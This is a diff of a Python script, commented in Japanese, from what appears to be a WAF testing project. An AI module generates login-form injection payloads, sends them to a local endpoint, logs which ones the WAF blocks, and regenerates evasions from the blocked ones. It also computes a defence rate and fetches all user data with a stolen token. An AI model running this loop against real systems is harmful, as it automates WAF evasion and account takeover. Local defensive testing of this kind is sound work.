@@ -1,42 +1,74 @@
 import requests
 import json
+import sys
 from Attacker import red_cloud_ai
-from Attacker import red_local_ai
+from Attacker import red_local_ai 
 
-# import challengeAPI
+#メイン関数(引数same_payloadは過去に生成したペイロードを使用して攻撃する場合に使用する)
+def main(same_payload):
 
-#メイン関数
-def main():
-    
-    logs = []  # 初期化
+    with open("./Attacker/attack_logs.json","r",encoding="utf-8") as f:
+        log_data = json.load(f)
 
-    ai_reply = red_local_ai.payload_ganerate(logs) #ローカルAI使用
-    # ai_reply = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
-
-    logs = payload_p(ai_reply)
-    a = input("攻撃結果ログを表示しますか？(y/n):")
-    if a in["Y","y","yes"]:
-        for i in logs:
-            print(f"攻撃ログ：{i}\n")
-    while True:
-        b = input("攻撃結果から新しい攻撃を生成しますか？(y/n):")
-        if b in["Y","y","yes"]:
-            #WAFでブロックされた攻撃ログのみを抽出し、新しい攻撃ペイロードを生成
-            blocked_logs = [log["ペイロード"] for log in logs if log["WAF"] == "Blocked" or log["ステータスコード"] == 500]
-            anather_logs = red_local_ai.payload_ganerate(blocked_logs) #ローカルAI使用
-            # anather_logs = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
-            c = input("新しく生成された攻撃で攻撃を実行しますか？(y/n):")
-            if c in["Y","y","yes"]:
-                logs = payload_p(anather_logs)
-                for i in logs:
-                    print(f"攻撃ログ：{i}\n")
-            else:
-                print("処理を終了します")
-                break
+        if not log_data:
+            logs = []
         else:
-            print("処理を終了します")
-            break
-       
+            logs = json.dumps(log_data,ensure_ascii=False,indent=2)
+    
+    ai_reply = None
+
+    while True:
+
+        print("1：攻撃ペイロード生成\n"
+              "2：生成したペイロードで攻撃\n"
+              "3：攻撃側操作終了\n")
+        
+        user_action = input("実施する機能番号を入力してください:")
+
+        match user_action:
+            case "1":
+        
+                #logsの中身がない場合（攻撃を一度も行ってない場合は攻撃結果を参照せずゼロから攻撃を生成する
+                if logs == []:
+                    ai_reply = generate_payload(logs)
+                    print(f"生成されたペイロード：{ai_reply}")
+
+                else:
+                    b = input("攻撃結果ログが存在します：\n"
+                              "ログ結果を使用し新しい攻撃ペイロードを生成しますか？(y/n):")
+                    if b in["Y","y","yes"]:
+                        ai_reply = generate_payload(logs)
+                        print(ai_reply)
+
+                
+
+            case "2":
+                c = input("※すでに攻撃済みの場合のみ※\n前回と同じ攻撃ペイロードを使用しますか？(y/n):")
+                #直近で生成したペイロードと一度生成したペイロードのどちらも存在しない場合
+                if not ai_reply and not same_payload:
+                    print("攻撃ペイロードが存在しません...")
+                #同じペイロードを使用した攻撃
+                elif c in ["Y","y","yes"]:
+                    if same_payload:
+                        logs = payload_p(same_payload)
+                    else:
+                        print("前回のペイロードが存在しないため、生成したペイロードで攻撃を行います...")
+                        logs = payload_p(ai_reply)
+                #直近で生成したペイロードを使用した場合
+                elif ai_reply and c in ["N","n","no"]:
+                    print("攻撃ペイロードを使用して攻撃を開始します...")
+                    logs = payload_p(ai_reply)
+                    print("新しい攻撃ペイロードを生成する場合は再度攻撃ペイロードを生成を選択してください")
+                else:
+                    print("エラーが発生したため処理を終了します...")
+                    break
+            case "3":
+                print("攻撃側の処理を終了します...")
+                return ai_reply
+            case _:
+                print("エラーが起きました、処理を終了します...")
+                sys.exit(1)
+        
     # user_token,logs = attack_p(*payload) #payloadは複数の戻り値があるので*を使用
     # print("現在のWAF防御率は:",defence_rate(logs))
     # if user_token:
@@ -45,11 +77,37 @@ def main():
     #         token_p(user_token)
     #     else:
     #         print("処理を終了します")
+def generate_payload(logs):
+
+    #攻撃ペイロードを生成
+    try:
+        ai_reply = red_local_ai.payload_ganerate(logs) #ローカルAI使用
+        # ai_reply = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
+        return ai_reply
+    except:
+        print("--攻撃分生成時にエラーが発生--")
+
+        #攻撃ペイロードを生成するのに失敗した場合3回までリトライする処理
+        for i in range(3):
+            try:
+                print(f"再試行中：{i+1}回目...")
+                ai_reply = red_local_ai.payload_ganerate(logs) #ローカルAI使用
+                # ai_reply = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
+                return ai_reply
+            except:
+                print(f"{i}回目の再試行処理が失敗...")
+
+        print("再試行でもエラーが発生したため処理を中断します...")
+        return None
+
+        
+    
 #攻撃用ペイロード
 def payload_p(ai_reply):
     logs = []
     url = "http://localhost:8000/rest/user/login"  # 攻撃対象のURL
     print(f"生成したペイロード:{ai_reply}")
+    #email_payloadsに生成したメールアドレスを入れるパスワードはaaa固定
     email_payloads = ai_reply 
     pass_payloads = "aaa"
     for i in email_payloads:
@@ -102,6 +160,11 @@ def payload_p(ai_reply):
     with open("./Attacker/attack_logs.json","w",encoding="utf-8") as f:
         json.dump(logs,f,ensure_ascii=False,indent=4)
 
+    a = input("攻撃結果ログを表示しますか？(y/n):")
+    if a in["Y","y","yes"]:
+        for i in logs:
+            print(f"攻撃ログ：{i}\n")
+
     return logs
 
 #ユーザーデータ取得
@@ -110,6 +173,7 @@ def token_p(token):
     rsa_auth = requests.get("http://localhost:3000/api/Users",headers=myheaders)
     print("ステータスコード:",rsa_auth.status_code)
     print("全ユーザー情報:", rsa_auth.json())
+
 #防御率計算
 def defence_rate(logs):
     total = len(logs)
